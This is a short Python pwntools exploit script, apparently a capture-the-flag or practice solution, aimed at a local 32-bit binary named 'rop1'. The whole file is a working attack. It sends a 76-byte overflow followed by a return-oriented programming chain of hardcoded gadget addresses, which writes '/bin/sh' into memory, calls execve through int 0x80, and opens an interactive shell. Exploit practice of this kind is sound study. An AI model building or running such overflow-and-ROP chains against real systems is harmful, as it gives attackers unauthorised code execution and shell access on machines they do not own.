#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "127.0.0.1"
port = "5050"
exe_path = './rop1'
#libc_path = './LIBC'
r = None
elf = None
libc_elf = None
def conn():
    global r, elf, libc_elf
    elf = ELF(exe_path)
    #libc_elf = ELF(libc_path)
    if _local:
        r = process(exe_path)
    else:
        r = remote(host, port)
conn()
if _ATT:
    log.info('Waiting for attach...')
    raw_input()

data_head = 0x080da060
# gadgets
pop_eax = 0x080a8c56
pop_ebx = 0x080481c9
xor_ecx_int_80 = 0x0806f041
pop_edx = 0x0806ec7b
mov_medx_eax = 0x08056d35

def write_addr(addr, val):
    return p32(pop_edx) + p32(addr) + p32(pop_eax) + val + p32(mov_medx_eax)

payload = 'A'*76
# prepare "/bin/sh"
payload += write_addr(data_head, '/bin')
payload += write_addr(data_head+4, '/sh\x00')

# execve("bin/sh", 0, 0)
payload += p32(pop_eax) + p32(0x0b)
payload += p32(pop_ebx) + p32(data_head)
payload += p32(pop_edx) + p32(0)
payload += p32(xor_ecx_int_80)

print len(payload)
print r.recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()
